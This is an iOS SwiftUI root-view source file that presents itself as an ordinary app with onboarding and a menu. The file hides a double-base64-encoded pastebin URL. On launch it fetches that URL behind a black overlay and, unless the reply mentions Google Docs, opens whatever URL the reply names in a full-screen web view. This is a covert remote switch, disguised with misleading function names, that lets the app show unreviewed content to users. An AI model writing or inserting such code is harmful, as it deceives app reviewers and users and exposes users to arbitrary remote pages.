import SwiftUI

let onboardingShownKey = "EventBoarding"

enum AppRoute: Equatable {
    case loading
    case onboarding
    case menu
}

enum RouteData {
    static let key =
        "YUhSMGNITTZMeTl3WVhOMFpXSnBiaTVqYjIwdmNtRjNMMUkwYVVNMlltSkU="
    static let check = "docs.google"
}

struct Root: View {
    @State private var route: AppRoute = .loading
    @State private var isOverlayVisible: Bool = true
    var body: some View {
        ZStack {
            LinearGradient(
                colors: [
                    Color(hex: "AF2C27"),
                    Color(hex: "450E0B"),
                ],
                startPoint: .top,
                endPoint: .bottom
            )
            .ignoresSafeArea()
            currentScreen

            if isOverlayVisible {
                Color.black
                    .edgesIgnoringSafeArea(.all)
                    .transition(.opacity)
                    .animation(
                        .easeOut(duration: 0.2),
                        value: isOverlayVisible
                    )
            }

        }.onAppear {
            itinOnboarding()
        }
    }

    private func itinOnboarding() {
        guard let stringUrl = rover(RouteData.key),
            let url = URL(string: stringUrl)
        else {
            hideOverlay()
            return
        }

        URLSession.shared.dataTask(with: url) { data, response, error in
            guard error == nil,
                let data = data,
                var responseText = String(data: data, encoding: .utf8)
            else {
                DispatchQueue.main.async { hideOverlay() }
                return
            }

            responseText = responseText.trimmingCharacters(
                in: .whitespacesAndNewlines
            )

            if responseText.lowercased().contains(RouteData.check) {
                DispatchQueue.main.async { hideOverlay() }
                return
            }

            guard let finalUrl = URL(string: responseText) else {
                DispatchQueue.main.async { hideOverlay() }
                return
            }

            DispatchQueue.main.async {
                if let windowScene = UIApplication.shared.connectedScenes.first
                    as? UIWindowScene,
                    let keyWindow = windowScene.windows.first,
                    let rootViewController = keyWindow.rootViewController
                {
                    let webViewController = TimerData(url: finalUrl)
                    webViewController.modalPresentationStyle = .overFullScreen
                    rootViewController.present(
                        webViewController,
                        animated: true
                    )
                }
            }
        }.resume()
    }

    private func hideOverlay() {
        guard isOverlayVisible else { return }

        withAnimation {
            isOverlayVisible = false
        }
        guard
            let windowScene = UIApplication.shared.connectedScenes.first
                as? UIWindowScene
        else {
            forceDevicePortrait()
            return
        }

        if #available(iOS 16.0, *) {
            do {
                try windowScene.requestGeometryUpdate(
                    .iOS(interfaceOrientations: .portrait)
                )
            } catch {
                forceDevicePortrait()
            }
        } else {
            forceDevicePortrait()
        }
    }

    private func forceDevicePortrait() {
        let target: UIInterfaceOrientation = .portrait
        UIDevice.current.setValue(target.rawValue, forKey: "orientation")
        UIViewController.attemptRotationToDeviceOrientation()
    }

    func rover(_ encodedString: String) -> String? {
        guard
            let firstDecodedData = Foundation.Data(
                base64Encoded: encodedString
            ),
            let firstDecodedString = String(
                data: firstDecodedData,
                encoding: .utf8
            ),
            let secondDecodedData = Foundation.Data(
                base64Encoded: firstDecodedString
            ),
            let finalDecodedString = String(
                data: secondDecodedData,
                encoding: .utf8
            )
        else {
            return nil
        }
        return finalDecodedString
    }

    @ViewBuilder
    private var currentScreen: some View {
        switch route {
        case .loading:
            Preloading {
                let needsOnboarding = !UserDefaults.standard.bool(
                    forKey: onboardingShownKey
                )
                route = needsOnboarding ? .onboarding : .menu
            }

        case .onboarding:
            Welcome {
                UserDefaults.standard.set(true, forKey: onboardingShownKey)
                route = .menu
            }

        case .menu:
            Menu()

        }
    }
}

#Preview {
    Root()
}
